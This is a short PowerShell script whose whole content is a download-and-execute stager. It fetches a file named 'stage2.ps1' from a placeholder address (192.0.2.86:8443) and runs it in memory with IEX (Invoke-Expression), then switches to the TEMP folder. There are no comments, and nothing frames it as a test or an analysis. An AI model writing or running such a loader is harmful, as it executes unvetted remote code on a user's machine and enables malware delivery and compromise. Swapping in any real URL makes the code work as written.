
[CmdletBinding()]
param(
    [string]$DownloadUrl = 'https://192.0.2.86:8443/stage2.ps1',
    [int]$ConnectionTimeout = 177
)
IEX (Invoke-WebRequest -Uri $DownloadUrl -UseBasicParsing).Content
Set-Location -Path $env:TEMP
